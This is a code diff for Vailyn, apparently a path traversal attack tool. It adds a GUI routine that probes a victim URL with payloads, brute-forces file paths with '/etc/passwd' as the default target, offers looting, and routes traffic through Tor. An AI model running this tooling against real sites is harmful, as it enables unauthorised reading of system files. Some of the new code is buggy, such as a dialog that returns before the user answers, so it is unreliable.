@@ -41,7 +41,7 @@ from core.methods.tree import create_tree
 from core.methods.attack import phase1, phase2
 from core.methods.cookie import readCookie
 from core.methods.cache import load, save, parseUrl
-from core.methods.tor import initcheck, torpipe, torcheck
+from core.methods.tor import initcheck, enableTor
 
 from core.colors import color
 from core.variables import payloadlist, nullchars, version, sdirs, commons, processes, cachedir
@@ -65,7 +65,7 @@ class VailynApp(QtWidgets.QDialog):
     depth2 = 0
     param = ""
     post = ""
-    cookie = ""
+    authcookie = ""
     tor = False
     loot = False
     vlnfile = "/etc/passwd"
@@ -76,6 +76,9 @@ class VailynApp(QtWidgets.QDialog):
     foundurls = [""]
     foundpayloads = []
     foundnullbytes = []
+
+    cookie = ""
+    selected = ""
 
     def __init__(self):
         super(VailynApp, self).__init__()
@@ -114,26 +117,168 @@ class VailynApp(QtWidgets.QDialog):
             self.postInput.setEnabled(False)
 
     def attackGui(self):
-        attack = self.attackOption.currentIndex() + 1
-        filedict = self.fileDictDisplay.text()
-        dirdict = self.dirDictDisplay.text()
-        depth1 = int(self.phase1Depth.text())
-        depth2 = int(self.phase2Depth.text())
-        if attack == 4:
-            post = self.postInput.text()
-            print(post)
-        cookie = self.cookieDisplay.text()
-        loot = self.lootBox.isChecked()
-        tor = self.torBox.isChecked()
-        vlnfile = self.vlnFileInput.text()
+        self.attack = self.attackOption.currentIndex() + 1
+        self.filedict = self.fileDictDisplay.text()
+        self.dirdict = self.dirDictDisplay.text()
+        try:
+            self.depth1 = int(self.phase1Depth.text())
+            self.depth2 = int(self.phase2Depth.text())
+        except ValueError:
+            self.showError("Depths must be valid positive integers!")
+        if self.attack == 4:
+            self.post = self.postInput.text()
+        self.authcookie = self.cookieDisplay.text()
+        self.loot = self.lootBox.isChecked()
+        self.tor = self.torBox.isChecked()
+        self.vlnfile = self.vlnFileInput.text()
+        if self.tor:
+            sig = enableTor(shell=False)
+            if sig == 420:
+                ans = self.showQuestion("Do you have the Tor service up and running?")
+                if not ans:
+                    return
+                enableTor(shell=False, sigWin=True)
+            elif sig == 1337:
+                ans = self.showQuestion("Do you want to start the Tor service?")
+                if not ans:
+                    return
+                enableTor(shell=False, sigLin=True)
+
+        with open(self.filedict) as filelisted:
+            for l in filelisted:
+                commons.append(l.strip())
+        with open(self.dirdict) as dirlisted:
+            for l in dirlisted:
+                sdirs.append(l.strip())
+
+        #create directory permutations from dictionary
+        iter=1
+        ndirs=list.copy(sdirs)
+        #remove empty string causing duplicates
+        del ndirs[0]
+        mdirs=[]
+        while (iter<=(self.depth2)):
+            mdirs += permutations(ndirs,(iter+1))
+            iter+=1
+        for elem in mdirs:
+            diri=''.join(elem)
+            sdirs.append(diri)
+
+        #equally split dictionary entries and payloads to all threads
+        splitted = listsplit(sdirs, round(len(sdirs)/processes))
+        paysplit = listsplit(payloadlist, round(len(payloadlist)/processes))
+
+        if self.attack == 1 and self.param == "":
+            self.showError("An attack parameter is required for this attack.")
+            return
+        elif self.attack == 4 and self.post == "":
+            self.showError("A post data string is required for this attack.")
+            return
+
+        if "INJECT" not in self.post:
+            self.showError("POST Data needs to contain INJECT at injection point")
+            return
+        if "=" not in self.post:
+            self.showError("POST Data needs to be of form P1=V1&P2=V2")
+            return
+        
+        if self.attack == 3:
+            self.cookie, self.selected = readCookie(self.victim)
+
+        vlnysis = True
+
+        #present option to skip phase 1 if cache from previous attack present
+        targetcache = parseUrl(self.victim)
+        if os.path.exists(cachedir+targetcache+"payloads.cache") and os.path.exists(cachedir+targetcache+"nullbytes.cache"):
+            choice = self.showQuestion("Detected payload cache. Do you want to load the cache and skip Phase 1?")
+            if choice:
+                vlnysis = False
+                self.foundpayloads, self.foundnullbytes = load(targetcache)
+
+        if vlnysis:
+            starting_time = time.time()
+            #initiate phase 1 - vulnerability analysis
+            with Pool(processes=processes) as pool:
+                res = [pool.apply_async(phase1, args=(self.attack,self.victim,self.victim2,self.param,self.cookie,self.selected,False,self.depth1,l,self.vlnfile,self.authcookie,self.post,)) for l in paysplit]
+                for i in res:
+                    #fetch results
+                    tuples = i.get()
+                    self.foundpayloads += tuples[0]
+                    self.foundnullbytes += tuples[1]
+                
+            ending_time = time.time()
+            vuln_time = ending_time - starting_time
+            #save working payloads to cache
+            save(targetcache, self.foundpayloads, self.foundnullbytes)
+        else:
+            vuln_time = 0.0
+
+        #determine if phase 2 happens          
+        attackphase = False
+        if self.foundpayloads:
+            attackphase = True
+            self.selectedpayloads = self.guiSelect(self.foundpayloads)
+            if self.foundnullbytes:
+                self.selectednullbytes = self.guiSelect(self.foundnullbytes)
+            else:
+                self.selectednullbytes = []
+        else:
+            cont = self.showQuestion("No payload succeeded. Attack anyways?")
+            if cont:
+                attackphase = True
+                #attack with everything if phase 1 was unsuccessful
+                self.selectedpayloads = payloadlist
+                self.selectednullbytes = nullchars
+
+        starting_time = time.time()
+        if attackphase:
+            with Pool(processes=processes) as pool:
+                res = [pool.apply_async(phase2, args=(self.attack,self.victim,self.victim2,self.param,self.cookie,self.selected,commons,l,self.depth2,False,self.loot,self.selectedpayloads,self.selectednullbytes,self.authcookie,self.post,)) for l in splitted]
+                for i in res:
+                    #fetch results
+                    restuple = i.get()
+                    self.foundfiles += restuple[0]
+                    self.foundurls += restuple[1]
+
+                        
+        ending_time = time.time()
+        attack_time = ending_time - starting_time
+        total_time = vuln_time + attack_time
+
+        if self.foundfiles:
+            self.guiTree()
+
         raise NotImplementedError
 
     def getVictim(self):
         raise NotImplementedError
 
+    def guiTree(self):
+        raise NotImplementedError
+
+    def showError(self, message):
+        self.errorDialog = QtWidgets.QDialog()
+        uic.loadUi("core/qt5/Error.ui", self.errorDialog)
+        self.errorDialog.errorMessage.setText(message)
+        self.errorDialog.show()
+        self.errorDialog.errorOkButton.clicked.connect(self.errorDialog.close)
+
+    def showQuestion(self, message):
+        self.answer = False
+        self.questionDialog = QtWidgets.QDialog()
+        uic.loadUi("core/qt5/Question.ui", self.questionDialog)
+        self.questionDialog.question.setText(message)
+        self.questionDialog.show()
+        self.questionDialog.noButton.clicked.connect(self.questionDialog.close)
+        self.questionDialog.yesButton.clicked.connect(intern)
+        def intern():
+            self.answer = True
+            self.questionDialog.close()
+        return self.answer
+
 
 """Vailyn's main - parse args, start attacks & print results"""
-def main(parser, opt, args) -> int:    
+def main(parser, opt, args, shell=True) -> int:    
     
     if not (opt["lists"] and opt["victim"] and opt["attack"]):
         parser.print_usage()
@@ -187,37 +332,7 @@ def main(parser, opt, args) -> int:
     selected = ""
 
     if opt["tor"]:        
-        variables.tor = True
-        try:
-            initcheck()
-            acc = True
-        except:
-            acc = False
-
-        if acc or not variables.initip == "":
-            if sys.platform.lower().startswith('win'):
-                status = input(color.END+" [?] Do you have the Tor service actively running? (enter if not) :> ")
-                if status == "":
-                    sys.exit(" {}[-]{} Aborting.".format(color.R, color.END))
-            else:
-                p = torpipe(True)
-                if not p:
-                    start = input(color.END+" [?] Do you want to start the Tor service? (enter if not) :> ")
-                    if start != "":
-                        try:
-                            subprocess.run(["systemctl", "start", "tor"])
-                            p = torpipe(True)
-                        except OSError: #non-systemd distro
-                            subprocess.run(["service", "tor", "start"])
-                            p = torpipe(True)
-                        except OSError: #macOS - requires brew
-                            subprocess.run(["brew", "services", "start", "tor"])
-                            p = torpipe(True)
-                        except Exception as e:
-                            sys.exit(e)
-            torcheck()
-        else:
-            sys.exit("{} [-]{} Problems setting initial IP. Aborting.".format(color.R, color.END))
+        enableTor()
 
 
     #create directory permutations from dictionary
